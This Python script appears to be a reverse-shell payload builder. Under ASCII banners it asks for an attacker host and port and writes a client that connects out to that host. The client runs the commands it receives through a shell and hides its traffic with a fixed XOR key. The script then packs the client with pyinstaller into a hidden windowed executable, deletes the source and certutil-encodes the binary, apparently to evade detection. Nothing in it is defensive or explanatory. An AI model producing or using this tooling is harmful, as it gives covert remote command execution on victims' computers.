import os
import random
import time

banner1 = """
'########::'##::::'##:'##::: ##::'######:::'##:::::::'########::'####::'######:::::'########:::::'###::::'##:::'##:'##::::::::'#######:::::'###::::'########::
 ##.... ##: ##:::: ##: ###:: ##:'##... ##:: ##::::::: ##.... ##: ####:'##... ##:::: ##.... ##:::'## ##:::. ##:'##:: ##:::::::'##.... ##:::'## ##::: ##.... ##:
 ##:::: ##: ##:::: ##: ####: ##: ##:::..::: ##::::::: ##:::: ##:. ##:: ##:::..::::: ##:::: ##::'##:. ##:::. ####::: ##::::::: ##:::: ##::'##:. ##:: ##:::: ##:
 ##:::: ##: ##:::: ##: ## ## ##: ##::'####: ##::::::: ##:::: ##:'##:::. ######::::: ########::'##:::. ##:::. ##:::: ##::::::: ##:::: ##:'##:::. ##: ##:::: ##:
 ##:::: ##: ##:::: ##: ##. ####: ##::: ##:: ##::::::: ##:::: ##:..:::::..... ##:::: ##.....::: #########:::: ##:::: ##::::::: ##:::: ##: #########: ##:::: ##:
 ##:::: ##: ##:::: ##: ##:. ###: ##::: ##:: ##::::::: ##:::: ##:::::::'##::: ##:::: ##:::::::: ##.... ##:::: ##:::: ##::::::: ##:::: ##: ##.... ##: ##:::: ##:
 ########::. #######:: ##::. ##:. ######::: ########: ########::::::::. ######::::: ##:::::::: ##:::: ##:::: ##:::: ########:. #######:: ##:::: ##: ########::
........::::.......:::..::::..:::......::::........::........::::::::::......::::::..:::::::::..:::::..:::::..:::::........:::.......:::..:::::..::........:::
"""

banner2 = """
><<<<<                              ><<      ><<<<<    ><<        ><<<<<<<                      ><<                         ><<
><<   ><<                           ><<      ><<   ><<  ><        ><<    ><<                    ><<                         ><<
><<    ><<><<  ><<><< ><<     ><<   ><<      ><<    ><<    ><<<<  ><<    ><<   ><<    ><<   ><< ><<   ><<       ><<         ><<
><<    ><<><<  ><< ><<  ><< ><<  ><<><<      ><<    ><<   ><<     ><<<<<<<   ><<  ><<  ><< ><<  ><< ><<  ><<  ><<  ><<  ><< ><<
><<    ><<><<  ><< ><<  ><<><<   ><<><<      ><<    ><<     ><<<  ><<       ><<   ><<    ><<<   ><<><<    ><<><<   ><< ><   ><<
><<   ><< ><<  ><< ><<  ><< ><<  ><<><<      ><<   ><<        ><< ><<       ><<   ><<     ><<   ><< ><<  ><< ><<   ><< ><   ><<
><<<<<      ><<><<><<<  ><<     ><< ><<<<<<<<><<<<<       ><< ><< ><<         ><< ><<<   ><<   ><<<   ><<      ><< ><<< ><< ><<
                             ><<                                                       ><<                                     
"""

banner3 = """
d8888b. db    db d8b   db  d888b  db      d8888b. Cb .d8888.   d8888b.  .d8b.  db    db db       .d88b.   .d8b.  d8888b. 
88  `8D 88    88 888o  88 88' Y8b 88      88  `8D `D 88'  YP   88  `8D d8' `8b `8b  d8' 88      .8P  Y8. d8' `8b 88  `8D 
88   88 88    88 88V8o 88 88      88      88   88  ' `8bo.     88oodD' 88ooo88  `8bd8'  88      88    88 88ooo88 88   88 
88   88 88    88 88 V8o88 88  ooo 88      88   88      `Y8b.   88~~~   88~~~88    88    88      88    88 88~~~88 88   88 
88  .8D 88b  d88 88  V888 88. ~8~ 88booo. 88  .8D    db   8D   88      88   88    88    88booo. `8b  d8' 88   88 88  .8D 
Y8888D' ~Y8888P' VP   V8P  Y888P  Y88888P Y8888D'    `8888Y'   88      YP   YP    YP    Y88888P  `Y88P'  YP   YP Y8888D' 

"""

banner4 = """
d8888b. db    db d8b   db  d888b  db      d8888b. Cb .d8888.   d8888b.  .d8b.  db    db db       .d88b.   .d8b.  d8888b. 
88  `8D 88    88 888o  88 88' Y8b 88      88  `8D `D 88'  YP   88  `8D d8' `8b `8b  d8' 88      .8P  Y8. d8' `8b 88  `8D 
88   88 88    88 88V8o 88 88      88      88   88  ' `8bo.     88oodD' 88ooo88  `8bd8'  88      88    88 88ooo88 88   88 
88   88 88    88 88 V8o88 88  ooo 88      88   88      `Y8b.   88~~~   88~~~88    88    88      88    88 88~~~88 88   88 
88  .8D 88b  d88 88  V888 88. ~8~ 88booo. 88  .8D    db   8D   88      88   88    88    88booo. `8b  d8' 88   88 88  .8D 
Y8888D' ~Y8888P' VP   V8P  Y888P  Y88888P Y8888D'    `8888Y'   88      YP   YP    YP    Y88888P  `Y88P'  YP   YP Y8888D' 


"""

banner5 = """
 __                   _    __   __     ___            _              _ 
(  )                 ( )  (  ) /_/    (   )          ( )            ( )
|   \  _ _  ____  __ | |  |   \   __  | O  |___  _ _ | | ___  ___  _| |
( O  )( U )( __ )/o )( )_ ( O  ) (_'  ( __/( o )( V )( )( o )( o )/ o )
/___/ /___\/_\/_\\__\/___\/____/  /__) /_\  /_^_\ ) / /_\ \_/ /_^_\\___\\
                  _|/                           /_/                    
"""

banner6 = """
 _    ||  _ ,    _       
[|)ungL_][|) s  ||)ayload
                L|       
"""

banner7 = """
______                   _    ______ _      ______           _                 _ 
|  _  \                 | |   |  _  ( )     | ___ \         | |               | |
| | | |_   _ _ __   __ _| |   | | | |/ ___  | |_/ /_ _ _   _| | ___   __ _  __| |
| | | | | | | '_ \ / _` | |   | | | | / __| |  __/ _` | | | | |/ _ \ / _` |/ _` |
| |/ /| |_| | | | | (_| | |___| |/ /  \__ \ | | | (_| | |_| | | (_) | (_| | (_| |
|___/  \__,_|_| |_|\__, \_____/___/   |___/ \_|  \__,_|\__, |_|\___/ \__,_|\__,_|
                    __/ |                               __/ |                    
                   |___/                               |___/                     
"""

banner8 = """
  ______                     ___     ______ __          _______             __                __ 
 |   _  \ .--.--.-----.-----|   |   |   _  |  .-----.  |   _   .---.-.--.--|  .-----.---.-.--|  |
 |.  |   \|  |  |     |  _  |.  |   |.  |   |_|__ --|  |.  1   |  _  |  |  |  |  _  |  _  |  _  |
 |.  |    |_____|__|__|___  |.  |___|.  |    \|_____|  |.  ____|___._|___  |__|_____|___._|_____|
 |:  1    /           |_____|:  1   |:  1    /         |:  |         |_____|                     
 |::.. . /                  |::.. . |::.. . /          |::.|                                     
 `------'                   `-------`------'           `---'                                     

"""

banner9 = """
  _____                    _      _____  _       _____            _                 _ 
 |  __ \                  | |    |  __ \( )     |  __ \          | |               | |
 | |  | |_   _ _ __   __ _| |    | |  | |/ ___  | |__) |_ _ _   _| | ___   __ _  __| |
 | |  | | | | | '_ \ / _` | |    | |  | | / __| |  ___/ _` | | | | |/ _ \ / _` |/ _` |
 | |__| | |_| | | | | (_| | |____| |__| | \__ \ | |  | (_| | |_| | | (_) | (_| | (_| |
 |_____/ \__,_|_| |_|\__, |______|_____/  |___/ |_|   \__,_|\__, |_|\___/ \__,_|\__,_|
                      __/ |                                  __/ |                    
                     |___/                                  |___/                     
"""

banner10 = """
DDD                L    DDD  ''      PPPP           l            d 
D  D               L    D  D ''      P   P          l            d 
D  D u  u nnn  ggg L    D  D     ss  PPPP   aa y  y l ooo  aa  ddd 
D  D u  u n  n g g L    D  D     s   P     a a y  y l o o a a d  d 
DDD   uuu n  n ggg LLLL DDD     ss   P     aaa  yyy l ooo aaa  ddd 
                 g                                y                
               ggg                             yyy                 
"""

try:
    # os.system("pip install cx_Freeze==6.3")
    os.system("pip install pyinstaller")
except:
    pass
os.system("cls")
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'
print(color.YELLOW)
banner = random.randint(1,10)
if banner ==1:print(banner1)
if banner ==2:print(banner2)
if banner ==3:print(banner3)
if banner ==4:print(banner4)
if banner ==5:print(banner5)
if banner ==6:print(banner6)
if banner ==7:print(banner7)
if banner ==8:print(banner8)
if banner ==9:print(banner9)
if banner ==10:print(banner10)
print(color.RED+"\n___________________________________________________________________________________\n")

try:
    lhost = input(color.BLUE + '[!]' + color.GREEN + " Nhap LHOST : "+color.CWHITE)
    lport = input(color.BLUE + '[!]' + color.GREEN + " Nhap LPORT : "+color.CWHITE)
    name =  input(color.BLUE + '[!]' + color.GREEN + " Nhap Output: "+color.CWHITE)
    f = open(name+'.py','w',encoding='utf-8')
    script ="""# Dun Dun ne

from subprocess import Popen, PIPE
from re import sub
import os, socket, getpass
key = b'111111111101111111111101111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'000111111101111111011111111111111111111111111111111111111111111111111111111111111111111111111111111101' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' \\
	  b'111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'

def getcmdline(path, winflag):
	if winflag:
		cmdline = path + '>'
	else:
		cmdline=getpass.getuser()+'@'+socket.gethostname()+':'+path+'$'
	return cmdline

def stringxor(s1,s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def encode_xor(data):
	data = data.encode()
	data = byte_xor(data,key)
	return data

def xor_decode(data):
	data = byte_xor(data,key)
	data = data.decode()
	return data



try:

	s = socket.socket()
	s.connect(('"""+lhost.strip()+"""', """+str(lport).strip()+"""))
	# s.connect(("192.168.0.117", 4444))
	winflag=0
	if os.name == "nt":
		winflag = 1
	cmdline = getcmdline(os.getcwd(),winflag)
	s.send(encode_xor(cmdline))
	# s.send(cmdline.encode())
	while True:
		data = s.recv(1024000)
		data = xor_decode(data)
		# data = data.decode()
		test = Popen(data, shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE) if winflag else Popen(data, shell=True, executable="/bin/bash", stdout=PIPE, stdin=PIPE, stderr=PIPE)
		out = test.stdout.read()
		err = test.stderr.read()
		op = out + err
		if len(data) > 3 and data[0: 3] == "cd ":
			path = sub("^\s*cd\s+", "",data)
			if os.path.exists(path):
				os.chdir(path)
				path = os.getcwd()
				cmdline = getcmdline(path,winflag)


		# data_send = op+('\\n'+cmdline).encode()
		# s.send(data_send)
		x = ('\\n' + cmdline).encode()
		data_send = op + x
		s.send(byte_xor(data_send,key))

except:
	pass
"""
    f.write(script)
    f.close()

    # print(os.path.abspath(__file__))
    os.system("pyinstaller --distpath ./ --onefile --windowed ./"+name+".py --debug noarchive")
    os.remove(".\\"+name+".spec")
    os.remove(".\\"+name+".py")
    # os.rmdir(".\\build")
    # os.system("python setup.py build")
    # os.system("curl http://192.168.0.148/share/emay.txt -o dung.txt")
    # os.remove(".\\"+name+".pyw")
    # os.remove(".\\setup_"+name+".py")
    os.system("cls")
    print(color.GREEN+"Done!")
    time.sleep(2)
    os.system("certutil -encode "+name+".exe"+" "+name+".txt")
except:
    pass